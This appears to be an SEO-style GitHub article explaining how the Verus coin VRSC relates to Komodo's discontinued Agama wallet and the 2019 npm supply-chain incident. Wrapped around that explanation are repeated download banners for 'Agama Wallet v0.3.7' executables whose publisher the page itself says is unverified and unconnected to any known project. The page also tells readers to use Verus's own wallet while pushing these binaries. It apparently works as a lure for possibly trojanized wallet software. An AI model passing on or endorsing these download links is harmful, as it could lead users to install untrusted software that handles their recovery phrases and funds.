[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Verus Wallet: What VRSC Is and Where It Runs

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

VRSC is the native coin of the Verus blockchain, and it is one of the assets Agama Wallet lists as supported. The two are separate projects that shared a wallet interface: Verus's own build was reported unaffected by the 2019 npm incident that hit Komodo's Agama, which is one reason the names should not be treated as synonyms.

## You'll see this if

A page or a thread mentions a "Verus Agama wallet" and you cannot tell whether that means Verus made Agama, Agama is Verus's wallet, or the two merely appeared together.

| Name | What it is | Relationship |
|---|---|---|
| Verus | A blockchain project with its own coin, VRSC | Independent project |
| VRSC | Verus's native coin | An asset Agama lists as supported |
| Agama (original) | Komodo's desktop wallet, to 2019 | Shared interface lineage, discontinued |
| Agama Wallet 0.3.7 | A release published on GitHub | Ownership unverified |

## Why it happens

Wallets in the Komodo ecosystem were built to hold several coins, and Verus was one of them. That produced builds and pages where "Agama" and "Verus" appear in the same sentence, which is accurate as a description of a multi-coin wallet and misleading as a description of ownership.

The 2019 supply-chain incident sharpened the distinction. Malicious code in an npm dependency used through the EasyDEX interface sent recovery material to a remote server, and Komodo moved customer funds and released patches. Verus stated at the time that its own build was unaffected. [The 2019 Agama vulnerability](https://github.com/agama-wallet/agama-wallet/blob/main/the-2019-supply-chain-incident.md) sets out what happened and what remains unverified.

So there are three separate things to keep apart: the Verus chain and its coin, the Komodo wallet that could hold VRSC, and the 0.3.7 release that now shares the Agama name without any established link to either project. The [Agama Wallet timeline](https://github.com/agama-wallet/agama-wallet/blob/main/two-products-one-name.md) dates the middle one.

## Fix

The task is deciding which software should hold VRSC, and the answer depends on which build you actually have.

1. **Identify the build.** A Komodo-era Agama install and a 2026 Agama Wallet beta are different products; the version and the download source separate them.
2. **For holding VRSC today, use Verus's own wallet software.** A coin's own project is the source of its current wallet, not a wallet built for another ecosystem.
3. **For recovering VRSC from an old install, treat the phrase as the portable part.** The software generation does not travel with it.
4. **Do not assume uniform behaviour across a multi-coin wallet.** A wallet that supports several chains applies each chain's rules separately, including derivation.
5. **Do not infer ownership from a shared interface.** A wallet listing an asset says nothing about who publishes the wallet.

If an old install holds both KMD and VRSC, treat it as two migrations rather than one, because the destination wallets differ.

## If that did not work

If VRSC does not appear after restoring into a Verus wallet, check the derivation and the address range before anything else. A phrase restored with the wrong defaults produces valid addresses that hold nothing.

If an amount appears in a block explorer but not in the wallet, the wallet is scanning the wrong range or the wrong chain, not missing funds.

If a download claims to be "Verus Agama" and offers a single installer for both, that combination does not correspond to either project's current software, and the safe response is to stop rather than to test it.

## Prevention

- **Use each project's own wallet for its own coin.** Multi-coin wallets are convenient and are not the authority on a chain's rules.
- **Keep the phrase separate from the installer.** Recovery material outlives every build.
- **Date any claim about "Verus Agama".** Before mid-2019 the phrase described a supported asset in a Komodo wallet; today it describes nothing current.
- **Do not read a shared interface as a partnership.** Wallets list assets they can hold, and a listing does not make a wallet authoritative for that chain's rules.
- **Check the publisher, not the logo.** [Is Agama Wallet safe](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md) covers what can and cannot be verified about the current download, including what the site does not publish.

## FAQ

### Did Verus make Agama Wallet?

No. Agama was Komodo's desktop wallet. Verus was one of the assets it supported, and Verus's own build was reported unaffected by the 2019 incident.

### Is VRSC affected by the 2019 npm vulnerability?

Verus stated at the time that its build was not affected. The malicious dependency reached users through the Komodo EasyDEX interface, which is why the impact was not uniform across wallets that shared code.

### Is the Agama Wallet 0.3.7 release Verus software?

No public record connects that download to Verus, Komodo or Gleec. It shares a name with the discontinued Komodo wallet and nothing more has been established.

### Why does a Verus wallet need its own derivation settings?

Because each chain defines how addresses are derived from recovery material, and a wallet built for another ecosystem may apply different defaults. The phrase can be identical and the resulting addresses different, which looks like an empty wallet rather than a settings mismatch.

### Can one wallet hold both KMD and VRSC today?

Only if that wallet is built for both chains and maintained for both. A discontinued desktop wallet is not a current home for either asset, whatever it once supported.

### Where should VRSC be held now?

In Verus's own wallet software, where the chain's rules and address formats are the project's responsibility. A discontinued Komodo wallet is not a current home for any asset.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Komodo Wallet: What It Is and How KMD Works](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-and-kmd.md)
- [The 2019 Agama Wallet Vulnerability, Explained](https://github.com/agama-wallet/agama-wallet/blob/main/the-2019-supply-chain-incident.md)
- [Is Agama Wallet Safe? What Can and Cannot Be Verified](https://github.com/agama-wallet/agama-wallet/blob/main/is-it-safe-to-use.md)
- [Which Blockchains Use the UTXO Model](https://github.com/agama-wallet/utxo/blob/main/which-chains-use-outputs.md)
